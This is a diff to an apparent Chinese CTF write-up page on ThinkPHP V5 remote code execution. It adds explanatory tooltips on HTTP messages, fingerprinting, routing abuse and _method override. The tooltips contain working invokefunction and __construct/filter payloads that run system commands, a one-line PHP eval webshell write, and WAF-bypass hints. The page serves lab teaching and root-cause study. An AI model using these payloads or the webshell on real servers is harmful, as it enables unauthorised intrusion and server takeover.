@@ -197,7 +197,28 @@
         .candidate-answer strong { color: var(--accent-cyan); }
         .candidate-answer .point-analysis { color: #fbbf24; font-weight: 600; margin-bottom: 5px; display: inline-block; }
         .candidate-answer .breakthrough { color: #a855f7; font-weight: 600; margin-bottom: 5px; display: inline-block; }
-
+	
+	        /* ================= 新增：顶部提示条样式 ================= */
+	        .top-tip {
+	            background: rgba(0, 240, 255, 0.03);
+	            border: 1px dashed rgba(0, 240, 255, 0.4);
+	            color: #8892b0;
+	            padding: 12px 20px;
+	            border-radius: 12px;
+	            text-align: center;
+	            margin-bottom: 2rem;
+	            cursor: pointer;
+	            transition: all 0.3s ease;
+	            font-size: 0.9rem;
+	            user-select: none;
+	        }
+	        .top-tip i { color: #00f0ff; margin-right: 8px; }
+	        .top-tip:hover {
+	            background: rgba(0, 240, 255, 0.08);
+	            border-color: #00f0ff;
+	            color: #ccd6f6;
+	        }
+	
         /* 6. 情景模拟卡片 (极具视觉冲击力的场景框) */
         .scenario-box {
             background: #0f172a;
@@ -357,6 +378,11 @@
 
     <div class="post-container">
         <h1>ThinkPHP V5 远程代码执行漏洞（RCE）复现</h1>
+        <!-- ================= 新增：顶部注释提示条 ================= -->
+        <div class="top-tip" onclick="document.querySelector('.term-tooltip').click()">
+            <i class="fas fa-info-circle"></i> 提示：文章中带有 <span style="color: #00f0ff; border-bottom: 1px dashed #00f0ff;">下划线虚线</span> 的术语均可点击查看详细注释
+        </div>
+
         <div class="date">
             <span><i class="far fa-calendar-alt"></i> 2026年10月5日</span>
             <span><i class="fas fa-tag"></i> ThinkPHP</span>
@@ -385,15 +411,14 @@
         <p>本题表面考的是“ThinkPHP 5 RCE 漏洞的利用”，但核心考察的是：</p>
         <ul>
             <li><strong>信息收集与指纹识别：</strong>看到页面就知道是“ThinkPHP V5”框架，联想到该框架在历史版本中存在多个致命 Nday（历史漏洞）。</li>
-            <li><strong>HTTP协议基础：</strong>考察是否能手写或修改合法的 HTTP 报文（请求行、请求头、空行、请求体）。</li>
-            <li><strong>漏洞原理理解与代码审计思维：</strong>理解为什么某些参数会导致代码执行，以及攻击链是如何形成的。</li>
+            <li><strong>HTTP协议基础：</strong>考察是否能手写或修改合法的 <span class="term-tooltip" data-target="tooltip-http-message">HTTP 报文</span>（请求行、请求头、空行、请求体）。</li>            <li><strong>漏洞原理理解与代码审计思维：</strong>理解为什么某些参数会导致代码执行，以及攻击链是如何形成的。</li>
             <li><strong>工具联动能力：</strong>从 Burp 手工打点，到写入 WebShell 后调用蚁剑可视化控制，理解整个后渗透流程。</li>
         </ul>
 
         <h3>2. 怎么想（攻击思路）</h3>
         <p>看到目标站点是一个纯静态的 ThinkPHP V5 欢迎页（“十年磨一剑”），没有明显功能入口。</p>
-        <p>第一步：识别指纹 -> ThinkPHP V5。联想到该框架存在经典的 RCE 漏洞。</p>
-        <p>第二步：思考漏洞触发点。通常利用 URL 路由机制（如 <code>invokefunction</code>）或请求参数覆盖机制（如 <code>_method=__construct</code>）。</p>
+        <p>第一步：<span class="term-tooltip" data-target="tooltip-fingerprint">识别指纹</span> -> ThinkPHP V5。联想到该框架存在经典的 RCE 漏洞。</p>
+       <p>第二步：思考漏洞触发点。通常利用 <span class="term-tooltip" data-target="tooltip-routing">URL 路由机制</span>（如 <code>invokefunction</code>）或 <span class="term-tooltip" data-target="tooltip-method-override">请求参数覆盖机制</span>（如 <code>_method=__construct</code>）。</p
         <p>第三步：打开 Burp Suite，拦截请求，尝试构造命令执行 Payload（如 <code>phpinfo()</code>）进行探测。</p>
         <p>第四步：如果成功回显，说明漏洞存在。将探测代码换成写入后门文件（WebShell）。</p>
         <p>第五步：用中国蚁剑连接后门，获取可视化服务器控制权限。</p>
@@ -1302,6 +1327,313 @@ SecRule REQUEST_URI "@rx (?i)\\\\think\\\\.*?(call_user_func_array|system|exec|s
 	                document.querySelectorAll('.term-tooltip').forEach(t => t.classList.remove('active'));
 	            }
 	        </script>
+		
+		        <!-- ================= 新增：HTTP 报文 术语注释弹窗 ================= -->
+		        <div id="tooltip-http-message" class="tooltip-panel">
+		            <h4>
+		                <span>HTTP 报文深度解析</span>
+		                <button class="close-tooltip" onclick="closeTooltip('tooltip-http-message')"><i class="fas fa-times"></i></button>
+		            </h4>
+		            <p><strong>1. 请求行 (Request Line) —— 信封上的“收件地址和意图”</strong></p>
+		            <p>这是信件的第一行，它告诉服务器：“我要对你做什么”。它由三个部分组成：请求方法 + URL路径 + HTTP版本。</p>
+		            <p>在你的靶场里长这样：<code>POST /index.php?s=index/\think\app/invokefunction... HTTP/1.1</code></p>
+		            <ul>
+		                <li><code>POST</code>：请求方法（意图）。表示我要提交/发送数据给你。（如果是 <code>GET</code>，就表示我只是来拿数据）。</li>
+		                <li><code>/index.php?s=...</code>：请求的路径（地址）。告诉服务器我要访问哪个文件，并带上参数。</li>
+		                <li><code>HTTP/1.1</code>：使用的 HTTP 协议版本号。</li>
+		            </ul>
+		
+		            <p><strong>2. 请求头 (Request Headers) —— 信封上的“附加信息标签”</strong></p>
+		            <p>紧接着请求行下面，是一堆格式为 <code>键: 值</code> 的数据。它告诉服务器：“我是谁，我带了什么格式的数据，我有什么要求”。</p>
+		            <ul>
+		                <li><code>Host: 192.168.242.246:8080</code>（我要访问的主机）</li>
+		                <li><code>User-Agent: Mozilla/5.0...</code>（我的浏览器身份）</li>
+		                <li><code>Content-Type: application/x-www-form-urlencoded</code>（我发给你的数据是标准表单格式）</li>
+		                <li><code>Cookie: xxx</code>（我的身份凭证）</li>
+		            </ul>
+		            <p><strong>护网视角：</strong>WAF（防火墙）极其依赖请求头来拦截攻击。比如，如果发现 <code>User-Agent</code> 是 <code>sqlmap</code>，WAF 直接拉黑；如果发现 <code>Content-Type</code> 异常，WAF 可能直接放行导致被绕过。</p>
+		
+		            <p><strong>3. 空行 (Blank Line) —— 信封的“封口线”</strong></p>
+		            <p>这是一个完全没有任何内容的空行（你需要在键盘上敲两次回车）。它的作用是告诉服务器：“我的附加信息（请求头）说完了，接下来是信的内容（请求体）了”。</p>
+		            <p><strong>你的血泪教训：</strong>还记得你之前报的 <code>400 Bad Request</code> 错误吗？就是因为你把 Payload 直接塞到了请求头里，忘记了敲这个空行。服务器解析混乱，直接把你的信退回了。加了空行之后，200 OK 就来了。</p>
+		            <p><strong>安全视角：</strong>有些高级 WAF 会解析 HTTP 协议，如果攻击者故意利用多个空行或畸形空行，有时可以绕过 WAF 的检测（俗称“HTTP 协议走私”）。</p>
+		
+		            <p><strong>4. 请求体 (Request Body) —— 信纸上的“正文内容”</strong></p>
+		            <p>这里是真正要发送给服务器的数据。</p>
+		            <ul>
+		                <li><strong>什么时候有？</strong>通常 <code>GET</code> 请求没有请求体（数据都在 URL 里）；而 <code>POST</code> 请求，数据就放在请求体里。</li>
+		                <li>在你的靶场里长这样：<code>_method=__construct&filter[]=system&method=get&get[]=whoami</code></li>
+		                <li>或者你上传木马时写的 <code>echo "&lt;?php eval(\$_POST['cmd']); ?&gt;" &gt; shell.php</code>。</li>
+		            </ul>
+		            <p><strong>护网视角：</strong>这是攻击代码（Payload）呆的地方。WAF 会在此处疯狂使用正则表达式，检测里面有没有 <code>system</code>、<code>eval</code>、<code>union select</code> 等恶意关键字。你之前尝试过用 <code>multipart/form-data</code> 改变请求体格式，或者用 Base64 编码，本质上都是在伪装请求体，试图绕过 WAF 的检查。</p>
+		
+		            <p><strong>📦 完整请求示例图：</strong></p>
+		            <div class="terminal-window" style="margin-bottom: 1rem;">
+		                <div class="terminal-header">
+		                    <div class="terminal-dot red"></div>
+		                    <div class="terminal-dot yellow"></div>
+		                    <div class="terminal-dot green"></div>
+		                </div>
+		                <pre><code>POST /index.php?s=index/\think\app/invokefunction... HTTP/1.1   &lt;-- 1. 请求行
+		Host: 192.168.242.246:8080                                       &lt;-- 2. 请求头开始
+		User-Agent: Mozilla/5.0...
+		Content-Type: application/x-www-form-urlencoded
+		Connection: keep-alive                                           &lt;-- 请求头结束
+		                                                                 &lt;-- 3. 空行（超级重要）
+		_method=__construct&filter[]=system&method=get&get[]=whoami      &lt;-- 4. 请求体</code></pre>
+		            </div>
+		        </div>
+	
+	        <!-- ================= 新增：指纹识别 术语注释弹窗 ================= -->
+	        <div id="tooltip-fingerprint" class="tooltip-panel">
+	            <h4>
+	                <span>指纹识别 深度解析</span>
+	                <button class="close-tooltip" onclick="closeTooltip('tooltip-fingerprint')"><i class="fas fa-times"></i></button>
+	            </h4>
+	            
+	            <p><strong>一、什么是“指纹”？</strong></p>
+	            <p>字面意思，指纹就是用来识别身份的唯一特征。在网络安全（渗透测试/护网）中，“指纹识别（Fingerprinting）”指的是：通过目标网站暴露出的各种特征，推断出它使用了什么操作系统、什么 Web 服务器、什么编程语言、什么框架、什么版本。</p>
+	            <p>打个通俗的比方：你是一个侦探，走到一栋房子前。你不需要进去，只要看一眼：</p>
+	            <ul>
+	                <li>房子是木头做的还是砖头做的？（操作系统）</li>
+	                <li>门口挂了什么品牌的招牌？（Web 中间件）</li>
+	                <li>透过窗户看屋里的人在说什么语言？（编程语言）</li>
+	                <li>墙上有没有贴“使用某某品牌智能门锁”的标签？（框架/CMS）</li>
+	            </ul>
+	            <p>把上面这些信息拼凑起来，你就得到了这栋房子的“指纹”。</p>
+	
+	            <p><strong>二、你其实已经做过一次完美的指纹识别了</strong></p>
+	            <p>你还记得你刚进入那个靶机时看到的页面吗？上面写着“十年磨一剑 - 为API开发设计的高性能框架”。那一瞬间，你的大脑完成了一次极其标准的指纹识别：</p>
+	            <ul>
+	                <li>你看到了这句话（特征）。</li>
+	                <li>你立刻判断出：这是一个 ThinkPHP V5 框架（识别出的技术栈）。</li>
+	                <li>你马上联想到：这个框架的历史版本有 RCE 漏洞（把指纹转化为了攻击思路）。</li>
+	                <li>随后你开始用 <code>_method</code> 和 <code>invokefunction</code> 去测试（验证指纹）。</li>
+	            </ul>
+	            <p>这就是为什么我把“信息收集与指纹识别”放在攻击链的第一步。</p>
+	
+	            <p><strong>三、常见的“指纹”有哪些？</strong></p>
+	            <p>在护网和渗透测试中，我们主要识别这几类特征：</p>
+	            <table style="width:100%; border-collapse:collapse; font-size:0.85rem; margin-bottom:1rem; color:#94a3b8; border:1px solid rgba(255,255,255,0.1);">
+	                <thead>
+	                    <tr style="background:rgba(0,240,255,0.05);">
+	                        <th style="padding:8px; border:1px solid rgba(255,255,255,0.1); color:#00f0ff; text-align:left;">指纹类别</th>
+	                        <th style="padding:8px; border:1px solid rgba(255,255,255,0.1); color:#00f0ff; text-align:left;">常见代表</th>
+	                        <th style="padding:8px; border:1px solid rgba(255,255,255,0.1); color:#00f0ff; text-align:left;">安全人员为什么关心它？</th>
+	                    </tr>
+	                </thead>
+	                <tbody>
+	                    <tr>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">操作系统</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">Linux、Windows Server</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">决定你提权用什么脚本（Linux 用 SUID，Windows 用 Mimikatz）。</td>
+	                    </tr>
+	                    <tr>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">Web 中间件</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">Apache、Nginx、Tomcat、IIS</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">决定你有没有像 Tomcat PUT 上传、Nginx 解析漏洞这样的缺口。</td>
+	                    </tr>
+	                    <tr>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">编程语言</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">PHP、Java、Python、Go</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">决定你写什么类型的木马（PHP 木马还是 JSP 木马）。</td>
+	                    </tr>
+	                    <tr>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">开发框架</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">ThinkPHP、Spring Boot、Struts2</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">决定你查哪个 CVE 漏洞。</td>
+	                    </tr>
+	                    <tr>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">CMS 系统</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">WordPress、Drupal、Discuz</td>
+	                        <td style="padding:8px; border:1px solid rgba(255,255,255,0.1);">通常带有强大的后台功能，弱口令和插件漏洞重灾区。</td>
+	                    </tr>
+	                </tbody>
+	            </table>
+	
+	            <p><strong>四、怎么识别指纹？（实战方法）</strong></p>
+	            <p>你可以通过很多免费工具和方法来识别指纹：</p>
+	            <ul>
+	                <li><strong>浏览器插件（最简单）：</strong>安装 Wappalyzer 插件，打开一个网站，它会在右上角自动告诉你这个网站用了什么技术栈。</li>
+	                <li><strong>主动探测（手工）：</strong>
+	                    <ul>
+	                        <li>看 HTTP 响应头：比如看到 <code>X-Powered-By: PHP/7.4</code> 就知道是 PHP 7.4；看到 <code>Server: nginx</code> 就知道是 Nginx。</li>
+	                        <li>访问不存在的页面：看到一个带有 ThinkPHP 标志的 404 报错页面，立刻暴露。</li>
+	                        <li>请求 <code>robots.txt</code> 或 <code>favicon.ico</code>：有些框架的标志会藏在这些文件里。</li>
+	                    </ul>
+	                </li>
+	                <li><strong>网络空间测绘引擎（护网必备）：</strong>FOFA、Hunter、Quake。你输入一个语法，比如 <code>app="ThinkPHP"</code>，它就能把全互联网使用这个框架的资产全找出来。</li>
+	            </ul>
+	
+	            <p><strong>⚔️ 五、为什么识别指纹是“第一步”？</strong></p>
+	            <p>因为安全漏洞是和具体的版本、技术栈强绑定的。</p>
+	            <ul>
+	                <li>如果指纹识别出是 ThinkPHP 5.1，你直接上 <code>invokefunction</code>，一发入魂。</li>
+	                <li>如果指纹识别出是 Tomcat 7，你直接去试 <code>PUT</code> 上传。</li>
+	                <li>如果你连指纹都没识别，对着一个 Java Spring 网站去狂轰 <code>_method=__construct</code>，别人只会把你当笑话。</li>
+	            </ul>
+	            <p><strong>在护网中，信息收集占了 60% 的时间。而“指纹识别”就是信息收集中最核心的一环。你的扫描器（Nmap）只能告诉你目标开了什么端口，而指纹识别才能告诉你：“这扇门后面，是不是正好藏着我能撬开的锁。”</strong></p>
+	        </div>
+	        <!-- ================= 新增：URL 路由机制 术语注释弹窗 ================= -->
+	        <div id="tooltip-routing" class="tooltip-panel">
+	            <h4>
+	                <span>URL 路由机制 深度解析</span>
+	                <button class="close-tooltip" onclick="closeTooltip('tooltip-routing')"><i class="fas fa-times"></i></button>
+	            </h4>
+	            
+	            <p><strong>一、什么是“URL 路由机制”？</strong></p>
+	            <p>路由（Routing），在 Web 开发里，指的是<strong>“根据用户请求的 URL，决定去执行哪一段代码”</strong>的规则。</p>
+	            <p>打个生活化的比方：你去一家大公司（Web 服务器），前台（路由机制）接待了你。</p>
+	            <ul>
+	                <li>你说：“我要找销售部的张经理”。</li>
+	                <li>前台根据公司内部的通讯录（路由规则），查到了张经理的工位，然后带你去见他。</li>
+	            </ul>
+	            <p>在 Web 世界里：</p>
+	            <ul>
+	                <li><code>URL</code>：就是你说的“我要找销售部的张经理”。</li>
+	                <li><code>路由机制</code>：就是前台的通讯录，它把 URL 翻译成后端具体的类、方法、函数。</li>
+	            </ul>
+	
+	            <p><strong>二、ThinkPHP 的路由是怎么工作的？</strong></p>
+	            <p>ThinkPHP 有自己的一套路由规则。最常见的格式是：<code>index.php?s=模块/控制器/操作</code></p>
+	            <ul>
+	                <li><strong>正常业务（开发者写的代码）：</strong>开发者写了一个用来发帖子的功能，路径可能是：<code>http://target.com/index.php?s=index/Article/add</code>。路由机制会解析这个 URL，去执行 <code>index</code> 模块下的 <code>Article</code> 控制器里的 <code>add()</code> 方法。</li>
+	                <li><strong>你的恶意攻击（利用框架底层代码）：</strong>你没有去访问开发者写的 <code>Article</code>，而是把路由指向了框架自身的底层类：<code>?s=index/\think\app/invokefunction...</code>。路由机制被欺骗了，它去执行了 ThinkPHP 底层 <code>\think\app</code> 这个类里面的 <code>invokefunction</code> 方法。</li>
+	            </ul>
+	
+	            <p><strong>三、什么是 invokefunction？</strong></p>
+	            <p>在 ThinkPHP 的底层源码中，<code>invokefunction</code> 是一个容器方法。它的本意是：<strong>“调用（invoke）某个函数（function）”</strong>。</p>
+	            <p>它原本是给框架内部使用的，设计初衷是为了方便框架动态地执行一些回调函数。它的工作方式大概是这样的：</p>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>// 伪代码
+	public function invokefunction($function, $vars) {
+	    // 也就是执行 call_user_func_array($function, $vars)
+	    call_user_func_array($function, $vars); 
+	}</code></pre>
+	            </div>
+	
+	            <p><strong>四、为什么这会变成致命的 RCE 漏洞？</strong></p>
+	            <p>因为 ThinkPHP 的<strong>路由解析过于灵活</strong>，并且<strong>没有做严格的白名单限制</strong>。</p>
+	            <p>你以为 <code>invokefunction</code> 只能调用框架内部写好的安全函数？错！攻击者可以通过路由和参数，强行控制它。</p>
+	            <p>我们把你当时成功的 Payload 逐字拆解：</p>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>?s=index/\think\app/invokefunction
+	&function=call_user_func_array
+	&vars[0]=system
+	&vars[1][]=whoami</code></pre>
+	            </div>
+	            <ul>
+	                <li><code>s=index/\think\app/invokefunction</code>：路由欺骗框架，让框架调用这个内部方法。</li>
+	                <li><code>invokefunction</code> 接收两个参数：<code>$function</code> 和 <code>$vars</code>。</li>
+	                <li>攻击者传入 <code>function=call_user_func_array</code>，强行把要调用的函数指定为 PHP 的“执行任意函数”函数。</li>
+	                <li><code>vars[0]=system</code>：指定 <code>call_user_func_array</code> 的第一个参数是 <code>system</code>。</li>
+	                <li><code>vars[1][]=whoami</code>：指定 <code>call_user_func_array</code> 的第二个参数是 <code>whoami</code>。</li>
+	            </ul>
+	            <p>最终，代码的逻辑变成了：<code>call_user_func_array('system', ['whoami'])</code></p>
+	            <p><strong>结果：<code>system('whoami')</code> 被成功执行！</strong></p>
+	        </div>
+	        <!-- ================= 新增：请求参数覆盖机制 术语注释弹窗 ================= -->
+	        <div id="tooltip-method-override" class="tooltip-panel">
+	            <h4>
+	                <span>请求参数覆盖机制 深度解析</span>
+	                <button class="close-tooltip" onclick="closeTooltip('tooltip-method-override')"><i class="fas fa-times"></i></button>
+	            </h4>
+	            
+	            <p><strong>一、通俗比喻：酒店前台的“换装游戏”</strong></p>
+	            <p>把这个机制想象成酒店前台登记系统。</p>
+	            <ul>
+	                <li><strong>_method（伪装机制）：</strong>正常情况下，客人（浏览器）只能通过发 <code>POST</code> 请求来登记（表单提交）。但开发者为了方便，告诉前台：“如果客人发的是 POST，但里面带了一个叫 <code>_method</code> 的暗号，说明客人其实想用 <code>PUT</code> 或者 <code>DELETE</code> 的方式登记。”前台一听：“好的，那我查一下客人带的是什么 <code>_method</code>。”</li>
+	                <li><strong>= __construct（恶意指令）：</strong>攻击者（你）发了 POST 请求，里面写了一个暗号：<code>_method=__construct</code>。前台一看，不去查 PUT 或 DELETE 了，直接把门外的“酒店经理（构造函数 <code>__construct</code>）”叫过来。</li>
+	                <li><strong>“覆盖机制”（终极灾难）：</strong>酒店经理（<code>__construct</code>）来了之后，他的工作原则是：“只要是客人带来的行李（<code>$_POST</code> 数组），我全盘照收，并且把行李贴满整个办公室（赋值给类的内部属性）。”于是，你不仅带入了 <code>_method</code>，还带了 <code>filter[]=system</code>。经理不管三七二十一，把办公室原来配置的“安全检查员（filter）”直接换成了“杀手（system）”。</li>
+	            </ul>
+	            <p>这就是请求参数覆盖：你不仅欺骗了前台，还让内部经理把你的恶意参数，强制覆盖了系统原本的安全配置。</p>
+	
+	            <p><strong>二、代码层深度拆解（到底发生了什么）</strong></p>
+	            <p>我们来看看 ThinkPHP 底层源码里，这三步是怎么发生的：</p>
+	            
+	            <p><strong>第一步：前台查询（<code>Request::method()</code> 方法）</strong></p>
+	            <p>正常代码是这样的：</p>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>// 检查是否有 _method 参数
+	if (isset($_POST['_method'])) {
+	    // 如果有，就把它当成真实的请求方法
+	    $this->method = $_POST['_method'];
+	    // 然后动态调用这个同名方法！（致命缺陷）
+	    $this->{$this->method}($_POST);
+	}</code></pre>
+	            </div>
+	            <p>问题出在 <code>$this-&gt;{$this-&gt;method}($_POST);</code> 这一行。如果你传入 <code>_method=__construct</code>，它就变成了 <code>$this-&gt;__construct($_POST);</code>。</p>
+	
+	            <p><strong>第二步：经理全盘照收（<code>Request::__construct()</code> 方法）</strong></p>
+	            <p>PHP 的魔术方法 <code>__construct</code>（构造函数）在对象创建时自动执行。它接收了你传入的 <code>$_POST</code> 数组，执行了类似下面的代码：</p>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>public function __construct($options = [])
+	{
+	    // 遍历你提交的所有 POST 参数
+	    foreach ($options as $name =&gt; $value) {
+	        // 如果 Request 类里有这个属性名，就把它覆盖掉！
+	        $this-&gt;$name = $value; 
+	    }
+	}</code></pre>
+	            </div>
+	            <p>你传了 <code>filter[]=system</code>，这段代码就把 <code>Request</code> 类内部的 <code>$this-&gt;filter</code> 属性，从原来安全的 <code>'htmlspecialchars'</code> 强制覆盖成了 <code>['system']</code>。</p>
+	
+	            <p><strong>第三步：杀手执行任务（触发 <code>call_user_func</code>）</strong></p>
+	            <p>框架后续在处理请求参数时，会调用 <code>input()</code> 方法去过滤数据。过滤时，会调用 <code>filterValue()</code> 方法，里面有一句：</p>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>call_user_func($this-&gt;filter, $value);</code></pre>
+	            </div>
+	            <p>因为你的 <code>$this-&gt;filter</code> 已经被覆盖成了 <code>system</code>，于是这句变成了：<code>call_user_func('system', 'whoami')</code>。系统命令 <code>whoami</code> 就这样被执行了！</p>
+	
+	            <p><strong>三、防御层视角：为什么它最终被修复了？</strong></p>
+	            <p>这个漏洞的核心在于<strong>“信任了用户的输入，并把它赋予了过高的权限”</strong>。</p>
+	            <ul>
+	                <li><strong>开发者的本意：</strong><code>_method</code> 只是为了兼容一些老旧的浏览器或 API 设计，实现 HTTP 方法的伪装；<code>__construct</code> 自动赋值是为了方便初始化配置。</li>
+	                <li><strong>攻击者的逻辑：</strong>“你允许我指定 <code>_method</code>，那我为什么不能传入 PHP 的魔术方法（如 <code>__construct</code>、<code>__destruct</code>）？你允许我把 <code>$_POST</code> 数组赋值给类属性，那我为什么不能覆盖 <code>filter</code> 或者 <code>method</code>？”</li>
+	                <li><strong>官方的补丁（ThinkPHP 5.0.24）：</strong>官方在后续版本中，直接加上了白名单校验。代码变成了这样：</li>
+	            </ul>
+	            <div class="terminal-window" style="margin-bottom: 1rem;">
+	                <div class="terminal-header">
+	                    <div class="terminal-dot red"></div>
+	                    <div class="terminal-dot yellow"></div>
+	                    <div class="terminal-dot green"></div>
+	                </div>
+	                <pre><code>if (isset($_POST['_method'])) {
+	    // 只允许这些合法的方法名
+	    $this-&gt;method = strtoupper($_POST['_method']);
+	    if (!in_array($this-&gt;method, ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])) {
+	        // 遇到非法的，直接拦截报错！
+	        throw new Exception('Invalid method');
+	    }
+	}</code></pre>
+	            </div>
+	            <p><em>（注：你的原始文本在此处截断，如果后续还有“加上...”相关的内容，你可以随时补充到这个代码块下方）</em></p>
+	        </div>
 	
         <div class="action-bar">
             <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
